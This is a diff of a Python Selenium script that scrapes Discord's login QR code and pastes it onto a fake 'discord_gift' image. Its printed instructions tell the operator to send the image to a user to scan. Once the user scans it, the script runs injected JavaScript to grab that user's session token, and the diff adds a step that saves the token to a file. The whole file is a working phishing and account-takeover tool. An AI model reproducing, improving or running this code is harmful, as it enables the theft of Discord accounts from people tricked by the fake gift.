@@ -1,36 +1,27 @@
-# Imports
-# ----------------------------------------
-# Main ---------
 from bs4 import BeautifulSoup
 from selenium import webdriver
 from PIL import Image
 import base64
 import time
 import os
-# Custom ---------
 from dtg import utitlites
-
-# Functions for editing the image
-# ----------------------------------------
 
 
 def logo_qr():
-    im1 = Image.open('temp/qr_code.png', 'r')
-    im2 = Image.open('temp/overlay.png', 'r')
+    im1 = Image.open('image/qr_code.png', 'r')
+    im2 = Image.open('image/overlay.png', 'r')
     im2_w, im2_h = im2.size
     im1.paste(im2, (60, 55))
-    im1.save('temp/final_qr.png', quality=95)
+    im1.save('image/final_qr.png', quality=95)
 
 
 def paste_template():
-    im1 = Image.open('temp/template.png', 'r')
-    im2 = Image.open('temp/final_qr.png', 'r')
+    im1 = Image.open('image/template.png', 'r')
+    im2 = Image.open('image/final_qr.png', 'r')
     im1.paste(im2, (120, 409))
     im1.save('discord_gift.png', quality=95)
 
 
-# Main Function, every useful thing happens here
-# ----------------------------------------
 def main():
     utitlites.show_logo()
     options = webdriver.ChromeOptions()
@@ -40,7 +31,7 @@ def main():
         options=options, executable_path=r'chromedriver.exe')
 
     driver.get('https://discord.com/login')
-    time.sleep(5)
+    time.sleep(utitlites.Config.DISCORD_WAIT_TIME)
     print('- Page loaded.')
 
     page_source = driver.page_source
@@ -49,7 +40,7 @@ def main():
 
     div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
     qr_code = div.find('img')['src']
-    file = os.path.join(os.getcwd(), 'temp/qr_code.png')
+    file = os.path.join(os.getcwd(), 'image/qr_code.png')
 
     img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
 
@@ -60,12 +51,12 @@ def main():
     logo_qr()
     paste_template()
 
-    print('- QR Code has been generated. > discord_gift.png')
-    print('Send the QR Code to user and scan. Waiting..')
+    print('+ QR Code has been generated > images/discord_gift.png')
+    print('+ Send the QR Code to user and scan. Waiting...')
 
     while True:
         if discord_login != driver.current_url:
-            print('Grabbing token..')
+            print('! Grabbing token..')
             token = driver.execute_script('''
 
     var req = webpackJsonp.push([
@@ -84,11 +75,13 @@ def main():
         }
     return token;   
                 ''')
-            print('---')
-            print('Token grabbed:', token)
+            print('-'*8)
+            print('+ Token grabbed:', token)
+            print('-'*8)
+            utitlites.save_results_to_file(str(token))
             break
 
-    print('Task complete.')
+    print('+ Task complete')
 
 
 if __name__ == '__main__':
